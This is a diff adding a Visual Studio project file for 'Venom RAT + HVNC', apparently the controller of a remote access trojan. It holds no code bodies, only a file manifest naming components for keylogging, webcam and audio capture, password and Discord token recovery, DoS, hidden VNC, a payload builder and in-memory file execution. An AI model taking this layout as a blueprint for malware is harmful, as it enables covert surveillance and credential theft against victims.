@@ -1,0 +1,370 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{6E8A778A-E434-4B28-B6CC-A3AE562B2FBE}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Venom RAT + HVNC</RootNamespace>
+    <AssemblyName>Venom RAT + HVNC</AssemblyName>
+    <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>Venom RAT + HVNC.ico</ApplicationIcon>
+    <StartupObject>Server.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="BouncyCastle.Crypto" />
+    <Reference Include="cGeoIp" />
+    <Reference Include="dnlib" />
+    <Reference Include="IconExtractor" />
+    <Reference Include="IP2Region" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json" />
+    <Reference Include="protobuf-net" />
+    <Reference Include="Siticone.Desktop.UI" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.DirectoryServices" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="Vestris.ResourceLib" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="HVNC\FrmBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmBuilder.Designer.cs">
+      <DependentUpon>FrmBuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HVNC\FrmMain.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmMain.Designer.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HVNC\FrmMassUpdate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmMassUpdate.Designer.cs">
+      <DependentUpon>FrmMassUpdate.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HVNC\FrmTransfer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmTransfer.Designer.cs">
+      <DependentUpon>FrmTransfer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HVNC\FrmURL.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmURL.Designer.cs">
+      <DependentUpon>FrmURL.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HVNC\FrmVNC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmVNC.Designer.cs">
+      <DependentUpon>FrmVNC.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HVNC\Utils\BuildInfo.cs" />
+    <Compile Include="HVNC\Utils\Utils.cs" />
+    <Compile Include="HVNC\WebBuilder\WebBuilder.cs" />
+    <Compile Include="KeyAuth\api.cs" />
+    <Compile Include="KeyAuth\encryption.cs" />
+    <Compile Include="KeyAuth\json_wrapper.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Quasar\Server\Forms\FrmReverseProxy.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Quasar\Server\Forms\FrmReverseProxy.Designer.cs">
+      <DependentUpon>FrmReverseProxy.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Algorithm\Aes256.cs" />
+    <Compile Include="Server\Algorithm\GetHash.cs" />
+    <Compile Include="Server\Algorithm\Sha256.cs" />
+    <Compile Include="Server\Algorithm\Zip.cs" />
+    <Compile Include="Server\Connection\Clients.cs" />
+    <Compile Include="Server\Connection\Listener.cs" />
+    <Compile Include="Server\FormMain.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\FormMain.Designer.cs">
+      <DependentUpon>FormMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\FormSendFileToMemory.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\FormSendFileToMemory.Designer.cs">
+      <DependentUpon>FormSendFileToMemory.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormAudio.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormAudio.Designer.cs">
+      <DependentUpon>FormAudio.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormBuilder.Designer.cs">
+      <DependentUpon>FormBuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormCertificate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormCertificate.Designer.cs">
+      <DependentUpon>FormCertificate.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormDownloadFile.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormDownloadFile.Designer.cs">
+      <DependentUpon>FormDownloadFile.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormFileManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormFileManager.Designer.cs">
+      <DependentUpon>FormFileManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormFileSearcher.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormFileSearcher.Designer.cs">
+      <DependentUpon>FormFileSearcher.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormFun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormFun.Designer.cs">
+      <DependentUpon>FormFun.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormKeylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormKeylogger.Designer.cs">
+      <DependentUpon>FormKeylogger.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormLogin.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormLogin.Designer.cs">
+      <DependentUpon>FormLogin.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormNetstat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormNetstat.Designer.cs">
+      <DependentUpon>FormNetstat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormPorts.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormPorts.Designer.cs">
+      <DependentUpon>FormPorts.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormProcessManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormProcessManager.Designer.cs">
+      <DependentUpon>FormProcessManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegistryEditor.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegistryEditor.Designer.cs">
+      <DependentUpon>FormRegistryEditor.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegValueEditBinary.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegValueEditBinary.Designer.cs">
+      <DependentUpon>FormRegValueEditBinary.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegValueEditMultiString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegValueEditMultiString.Designer.cs">
+      <DependentUpon>FormRegValueEditMultiString.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegValueEditString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegValueEditString.Designer.cs">
+      <DependentUpon>FormRegValueEditString.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegValueEditWord.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormRegValueEditWord.Designer.cs">
+      <DependentUpon>FormRegValueEditWord.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormRemoteDesktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormRemoteDesktop.Designer.cs">
+      <DependentUpon>FormRemoteDesktop.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormShell.Designer.cs">
+      <DependentUpon>FormShell.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Forms\FormWebcam.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Server\Forms\FormWebcam.Designer.cs">
+      <DependentUpon>FormWebcam.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server\Handle_Packet\HandleAudio.cs" />
+    <Compile Include="Server\Handle_Packet\HandleDiscordRecovery.cs" />
+    <Compile Include="Server\Handle_Packet\HandleDos.cs" />
+    <Compile Include="Server\Handle_Packet\HandleFileManager.cs" />
+    <Compile Include="Server\Handle_Packet\HandleFileSearcher.cs" />
+    <Compile Include="Server\Handle_Packet\HandleFun.cs" />
+    <Compile Include="Server\Handle_Packet\HandleInformation.cs" />
+    <Compile Include="Server\Handle_Packet\HandleKeylogger.cs" />
+    <Compile Include="Server\Handle_Packet\HandleListView.cs" />
+    <Compile Include="Server\Handle_Packet\HandleLogs.cs" />
+    <Compile Include="Server\Handle_Packet\HandleNetstat.cs" />
+    <Compile Include="Server\Handle_Packet\HandlePassword.cs" />
+    <Compile Include="Server\Handle_Packet\HandlePing.cs" />
+    <Compile Include="Server\Handle_Packet\HandleProcessManager.cs" />
+    <Compile Include="Server\Handle_Packet\HandleRecovery.cs" />
+    <Compile Include="Server\Handle_Packet\HandleRegManager.cs" />
+    <Compile Include="Server\Handle_Packet\HandleRemoteDesktop.cs" />
+    <Compile Include="Server\Handle_Packet\HandleReportWindow.cs" />
+    <Compile Include="Server\Handle_Packet\HandleShell.cs" />
+    <Compile Include="Server\Handle_Packet\HandleThumbnails.cs" />
+    <Compile Include="Server\Handle_Packet\HandleWebcam.cs" />
+    <Compile Include="Server\Handle_Packet\Packet.cs" />
+    <Compile Include="Server\Helper\AeroListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Server\Helper\AsyncTask.cs" />
+    <Compile Include="Server\Helper\ByteConverter.cs" />
+    <Compile Include="Server\Helper\CreateCertificate.cs" />
+    <Compile Include="Server\Helper\DingDing.cs" />
+    <Compile Include="Server\Helper\HexEditor\ByteCollection.cs" />
+    <Compile Include="Server\Helper\HexEditor\Caret.cs" />
+    <Compile Include="Server\Helper\HexEditor\EditView.cs" />
+    <Compile Include="Server\Helper\HexEditor\HexEditor.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Server\Helper\HexEditor\HexViewHandler.cs" />
+    <Compile Include="Server\Helper\HexEditor\IKeyMouseEventHandler.cs" />
+    <Compile Include="Server\Helper\HexEditor\StringViewHandler.cs" />
+    <Compile Include="Server\Helper\IconInjector.cs" />
+    <Compile Include="Server\Helper\ListViewColumnSorter.cs" />
+    <Compile Include="Server\Helper\ListviewDoubleBuffer.cs" />
+    <Compile Include="Server\Helper\Methods.cs" />
+    <Compile Include="Server\Helper\NativeMethods.cs" />
+    <Compile Include="Server\Helper\ReferenceLoader.cs" />
+    <Compile Include="Server\Helper\RegistryKeyExtensions.cs" />
+    <Compile Include="Server\Helper\RegistryKeyHelper.cs" />
+    <Compile Include="Server\Helper\RegistrySeeker.cs" />
+    <Compile Include="Server\Helper\RegistryTreeView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Server\Helper\RegistryValueLstItem.cs" />
+    <Compile Include="Server\Helper\RegValueHelper.cs" />
+    <Compile Include="Server\Helper\ReverseProxyClient.cs" />
+    <Compile Include="Server\Helper\ReverseProxyServer.cs" />
+    <Compile Include="Server\Helper\WordTextBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Server\MessagePack\BytesTools.cs" />
+    <Compile Include="Server\MessagePack\MsgPack.cs" />
+    <Compile Include="Server\MessagePack\MsgPackArray.cs" />
+    <Compile Include="Server\MessagePack\MsgPackEnum.cs" />
+    <Compile Include="Server\MessagePack\MsgPackType.cs" />
+    <Compile Include="Server\MessagePack\ReadTools.cs" />
+    <Compile Include="Server\MessagePack\WriteTools.cs" />
+    <Compile Include="Server\Program.cs" />
+    <Compile Include="Server\Properties\Resources.cs" />
+    <Compile Include="Server\Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Server\Settings.cs" />
+    <Compile Include="StreamLibrary\CodecOption.cs" />
+    <Compile Include="StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="HVNC\FrmBuilder.resources" />
+    <EmbeddedResource Include="HVNC\FrmMain.resources" />
+    <EmbeddedResource Include="HVNC\FrmMassUpdate.resources" />
+    <EmbeddedResource Include="HVNC\FrmTransfer.resources" />
+    <EmbeddedResource Include="HVNC\FrmURL.resources" />
+    <EmbeddedResource Include="HVNC\FrmVNC.resources" />
+    <EmbeddedResource Include="Quasar\Server\Forms\FrmReverseProxy.resources" />
+    <EmbeddedResource Include="Server\FormMain.resources" />
+    <EmbeddedResource Include="Server\FormSendFileToMemory.resources" />
+    <EmbeddedResource Include="Server\Forms\FormAudio.resources" />
+    <EmbeddedResource Include="Server\Forms\FormBuilder.resources" />
+    <EmbeddedResource Include="Server\Forms\FormCertificate.resources" />
+    <EmbeddedResource Include="Server\Forms\FormDownloadFile.resources" />
+    <EmbeddedResource Include="Server\Forms\FormFileManager.resources" />
+    <EmbeddedResource Include="Server\Forms\FormFileSearcher.resources" />
+    <EmbeddedResource Include="Server\Forms\FormFun.resources" />
+    <EmbeddedResource Include="Server\Forms\FormKeylogger.resources" />
+    <EmbeddedResource Include="Server\Forms\FormLogin.resources" />
+    <EmbeddedResource Include="Server\Forms\FormNetstat.resources" />
+    <EmbeddedResource Include="Server\Forms\FormPorts.resources" />
+    <EmbeddedResource Include="Server\Forms\FormProcessManager.resources" />
+    <EmbeddedResource Include="Server\Forms\FormRegistryEditor.resources" />
+    <EmbeddedResource Include="Server\Forms\FormRegValueEditBinary.resources" />
+    <EmbeddedResource Include="Server\Forms\FormRegValueEditMultiString.resources" />
+    <EmbeddedResource Include="Server\Forms\FormRegValueEditString.resources" />
+    <EmbeddedResource Include="Server\Forms\FormRegValueEditWord.resources" />
+    <EmbeddedResource Include="Server\Forms\FormRemoteDesktop.resources" />
+    <EmbeddedResource Include="Server\Forms\FormShell.resources" />
+    <EmbeddedResource Include="Server\Forms\FormWebcam.resources" />
+    <EmbeddedResource Include="Server\Properties\Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="Server\Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
